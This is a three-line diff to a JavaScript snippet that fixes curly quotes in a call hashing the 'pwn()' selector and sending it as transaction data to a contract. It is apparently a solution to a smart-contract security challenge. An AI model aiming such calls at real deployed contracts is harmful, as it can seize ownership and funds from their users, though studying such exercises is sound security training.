@@ -1,3 +1,3 @@
-var holder = web3.utils.keccak256(“pwn()”)
+var holder = web3.utils.keccak256("pwn()")
 
 await contract.sendTransaction({data:holder})
